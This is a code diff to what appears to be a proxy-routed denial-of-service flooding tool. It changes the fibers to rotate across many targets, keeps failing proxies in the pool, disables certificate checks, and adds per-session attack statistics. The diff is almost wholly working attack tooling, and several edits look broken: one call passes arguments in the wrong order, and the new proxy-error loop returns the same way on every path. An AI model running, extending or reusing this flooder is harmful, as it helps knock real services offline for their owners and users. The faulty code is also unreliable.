@@ -10,6 +10,7 @@ from curio import ssl, socket
 from dataclasses import dataclass, field
 from functools import partial
 import json
+from itertools import cycle
 from logging import basicConfig, getLogger
 from math import log2, trunc
 from pathlib import Path
@@ -72,6 +73,13 @@ SSL_CTX.verify_mode = ssl.CERT_NONE
 
 ERR_NO_BUFFER_AVAILABLE = 55
 
+# on receive this error, the proxy should be removed from the pool
+IRRECOVERABLE_PROXY_ERRORS: List[str] = [
+    "407 Proxy Authentication Required",
+    "Invalid proxy response",
+    "Unexpected SOCKS version number",
+]
+
 
 @dataclass
 class Target:
@@ -130,7 +138,8 @@ async def try_connect_proxy(
     proxy = Proxy.from_url(proxy_url)
     try:
         conn = await curio.timeout_after(
-            timeout_seconds, curio.open_connection, proxy.proxy_host, proxy.proxy_port)
+            timeout_seconds,
+            curio.open_connection(proxy.proxy_host, proxy.proxy_port, source_addr=("0.0.0.0", 0)))
         await conn.close()
     except Exception as e:
         ctx.track_error(f"Proxy conn error: {proxy_url} {e}")
@@ -206,12 +215,16 @@ class Stats:
         self.current_session: Dict[int, int] = defaultdict(int)
         # the last bucket is dedicated for 100% succesfull execution only
         self.packets_per_session: List[int] = [0]*(self._hist_buckets+1)
+        self.sessions: int = 0
 
     def track_packet_sent(self, fid: int, size: int) -> None:
         self.total_bytes_sent += size
         self.packets_sent += 1
         if self._hist_buckets > 0:
             self.current_session[fid] += 1
+
+    def start_session(self, fid: Optional[int] = None) -> None:
+        self.sessions += 1
 
     def reset_session(self, fid: int) -> None:
         if self._hist_buckets > 0:
@@ -242,6 +255,7 @@ class Context:
     ):
         self.args = args
         self.targets = targets
+        self.targets_iter = cycle(targets)
         self.strategy = strategy
         self.proxies = proxies
         self.num_fibers = num_fibers
@@ -264,6 +278,9 @@ class Context:
     def track_packet_sent(self, fid: int, target: Target, size: int) -> None:
         if size > 0:
             self.stats[target.url].track_packet_sent(fid, size)
+
+    def start_session(self, fid: int, target: Target) -> None:
+        self.stats[target.url].start_session(fid)
 
     def reset_session(self, fid: int, target: Target) -> None:
         self.stats[target.url].reset_session(fid)
@@ -447,11 +464,13 @@ async def flood_packets_gen(
         # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
         # if the target is dead, we should not remove proxy from the pool
         ctx.track_error(e)
-        ctx.proxies.mark_dead(proxy_url)
+        # xxx(okachaiev): do this only when happened multiple times
+        # ctx.proxies.mark_dead(proxy_url)
     except Exception as e:
-        # xxx(okachaiev): some errors should be a reason to remove proxy from the pool,
-        # e.g. when negotiation failed
-        ctx.track_error(f"Proxy error: proxy={proxy_url} target={target.url} {e}")
+        for error in IRRECOVERABLE_PROXY_ERRORS:
+            if error in str(e):
+                ctx.track_error(f"Proxy error: proxy={proxy_url} target={target.url} {e}")
+                return packet_sent
         return packet_sent
     finally:
         if stream:
@@ -645,15 +664,20 @@ async def DGB(ctx: Context, fid: int, target: Target):
     """
     pass
 
-
 async def flood_fiber(fid: int, ctx: Context, target: Target):
+    ctx.start_session(fid, target)
+    # run a flood session (for TCP connections this would typically mean
+    # sending RPC number of packets)
+    await ctx.strategy(ctx, fid, target)
+    # resetting session is only used stats tracking (per session packets hist)
+    # xxx(okachaiev): this might be done as context manager with "ContextSession"
+    ctx.reset_session(fid, target)
+
+
+async def flood_fiber_loop(fid: int, ctx: Context):
     while True:
-        # run a flood session (for TCP connections this would typically mean
-        # sending RPC number of packets)
-        await ctx.strategy(ctx, fid, target)
-        # resetting session is only used stats tracking (per session packets hist)
-        # xxx(okachaiev): this might be done as context manager with "ContextSession"
-        ctx.reset_session(fid, target)
+        target = next(ctx.targets_iter)
+        await flood_fiber(ctx, fid, target)
 
 
 async def load_proxies(ctx: Context):
@@ -677,11 +701,10 @@ async def flood(ctx: Context):
     await load_proxies(ctx)
 
     group = curio.TaskGroup()
-    for target in ctx.targets:
-        print(f"==> Launching {ctx.num_fibers} fibers "
-              f"targeting {target.url} for {ctx.duration_seconds}s")
-        for fid in range(ctx.num_fibers):
-            await group.spawn(flood_fiber, fid, ctx, target)
+    print(f"==> Launching {ctx.num_fibers} fibers "
+          f"testing {len(ctx.targets)} targets for {ctx.duration_seconds}s")
+    for fid in range(ctx.num_fibers):
+        await group.spawn(flood_fiber_loop, fid, ctx)
 
     started_at = time.time()
     while time.time() < started_at + ctx.duration_seconds:
@@ -757,7 +780,7 @@ def parse_args(available_strategies):
         "--concurrency",
         type=int,
         default=8,
-        help="Number of fibers per target (for TCP means max number of open connections)"
+        help="Total number of fibers (for TCP attacks means max number of open connections)"
     )
     parser.add_argument(
         "-s",
